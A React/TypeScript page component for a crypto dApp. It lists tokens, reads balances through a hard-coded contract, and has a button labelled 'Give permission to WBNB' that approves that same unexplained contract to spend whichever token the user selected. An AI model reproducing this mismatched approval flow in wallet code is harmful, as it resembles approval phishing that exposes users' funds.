import { useEthers } from "@usedapp/core";
import { BigNumber, ethers } from "ethers";
import { FC, useEffect, useState } from "react";

import { getTokensByChainId } from "@/shared/lib/api/1inch/tokens";
import { Token } from "@/shared/lib/api/1inch/tokens/types";
import { commonTokens } from "@/shared/lib/constants";
import { Button, Container, Input, TokensList } from "@/shared/ui";

import * as S from "./style";

const ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function getUserBalances(address user, address[] calldata tokens) external view returns (uint256[] memory balances)",
];

export const MainPage: FC = () => {
  const [tokens, setTokens] = useState<Token[]>([]);
  const [search, setSearch] = useState<string>("");
  const [selectedToken, setSelectedToken] = useState<string>("");
  const [tokenBalances, setTokenBalances] = useState<string[]>([]);
  const { chainId, library, account } = useEthers();

  useEffect(() => {
    if (!chainId) {
      return;
    }

    (async function () {
      const { data } = await getTokensByChainId(chainId.toString());

      const tokensArr = Object.values(data.tokens);
      setTokens(tokensArr);
    })();
  }, [chainId]);

  useEffect(() => {
    if (tokens.length && account && library) {
      (async function () {
        const signer = library?.getSigner();
        const contract = new ethers.Contract("0xe47085AaA1dc8122f5A1f623068967b3bc92782c", ABI, signer);

        const balances = await contract.getUserBalances(
          account,
          tokens.filter((item) => item.address !== "0x").map((item) => item.address),
        );
        setTokenBalances(balances.map((item: BigNumber) => item.toString()));
      })();
    }
  }, [tokens, account, library]);

  const onApprove = async () => {
    if (!selectedToken) {
      return;
    }

    const signer = library?.getSigner();
    const contract = new ethers.Contract(selectedToken, ABI, signer);

    await contract.approve("0xe47085AaA1dc8122f5A1f623068967b3bc92782c", "9999999999");
  };

  return (
    <S.Root>
      <Container>
        <S.Block>
          <S.Title>Select a Token</S.Title>
          <S.Search>
            <Input
              value={search}
              onChange={(value) => setSearch(value as string)}
              placeholder="Search name or paste address"
            />
          </S.Search>

          <S.Tokens>
            <S.TokensTitle>Common tokens</S.TokensTitle>
            <S.TokensList>
              {chainId !== undefined && commonTokens["ch" + chainId.toString()]?.map((item) => (
                <S.TokensItem
                  key={item.address}
                  selected={item.address === selectedToken}
                  onClick={() =>
                    item.address === selectedToken ? setSelectedToken("") : setSelectedToken(item.address)
                  }
                >
                  {item.logo}
                  {item.symbol}
                </S.TokensItem>
              ))}
            </S.TokensList>
          </S.Tokens>

          <TokensList
            selectedToken={selectedToken}
            onSelect={setSelectedToken}
            tokens={tokens
              .filter(
                (item) =>
                  item.name.toLowerCase().includes(search.toLowerCase()) ||
                  item.address.toLowerCase().includes(search.toLowerCase()) ||
                  item.symbol.toLowerCase().includes(search.toLowerCase()),
              )
              .map((item, index) => ({
                name: item.name,
                symbol: item.symbol,
                img: item.logoURI,
                amount: tokenBalances.length ? tokenBalances[index] : "0",
                address: item.address,
              }))}
          />

          <S.SubmitButton>
            <Button stretch size="large" onClick={onApprove}>
              Give permission to WBNB
            </Button>
          </S.SubmitButton>
        </S.Block>
      </Container>
    </S.Root>
  );
};
